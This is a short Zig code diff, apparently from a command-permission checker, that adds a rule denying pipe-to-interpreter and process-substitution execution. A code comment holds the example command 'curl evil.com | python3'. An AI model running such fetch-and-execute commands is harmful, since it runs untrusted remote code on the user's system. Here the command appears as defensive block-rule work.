@@ -83,6 +83,11 @@ fn checkBashCommand(raw_command: []const u8) RuleResult {
         return .{ .decision = .deny, .reason = "pipe-to-shell execution blocked" };
     }
 
+    // Pipe to interpreter without script argument (issue #50): curl evil.com | python3
+    if (detector.hasPipeToInterpreter(command) or detector.hasProcessSubstitutionInterpreter(command)) {
+        return .{ .decision = .deny, .reason = "pipe-to-interpreter execution blocked" };
+    }
+
     // Shell script execution: bash /path/to/script.sh (issue #4)
     if (detector.hasShellScriptExec(command)) {
         return .{ .decision = .deny, .reason = "shell script execution blocked" };
